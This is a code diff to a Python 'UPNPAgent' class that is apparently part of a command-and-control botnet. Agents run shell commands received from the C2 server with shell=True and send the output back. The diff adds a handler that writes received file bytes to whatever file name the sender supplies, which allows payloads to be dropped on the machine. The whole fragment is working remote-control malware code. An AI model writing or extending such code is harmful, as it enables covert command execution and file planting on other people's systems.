@@ -110,20 +110,23 @@ class UPNPAgent:
     def process_message(self, agent_ip: str, message: bytes):
         command = message[0]
         message_content = message[1:]
-        if self.is_c2:
-            if agent_ip in self.agents:
-                print(f"\nMESSAGE {agent_ip}: {message_content.decode('utf8')}")
-                open('message_history.txt', 'a+', encoding='utf8').write(f"{agent_ip} -> {message_content}\n")
-        elif not self.is_c2:
+        if command == ord('m'):
+            print(f"\nReceived message from {agent_ip}: {message_content.decode('utf8')}")
+        elif command == ord('f'):
+            filename_length = int.from_bytes(message_content[:4], byteorder='big')
+            file_name = message_content[4:filename_length+4].decode('utf8')
+            file_bytes = message_content[filename_length+4:]
+            with open(file_name, 'wb') as f:
+                f.write(file_bytes)
+            print(f"Recevied file from {agent_ip}: {file_name}")
+        if not self.is_c2:
             if command == ord('c'):
                 print("\nReceived C2 Command ", message_content.decode('utf8'))
                 command_str = message_content.decode('utf8')
                 process = subprocess.Popen(command_str, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 stdout, stderr = process.communicate()
                 self.queue_message(agent_ip, b'm', stdout + b'\n' + stderr + b'\n')
-            elif command == ord('m'):
-                print("\nReceived C2 Message ", message_content.decode('utf8'))
-            
+
 
     def _start_agent_search(self):
         while True:
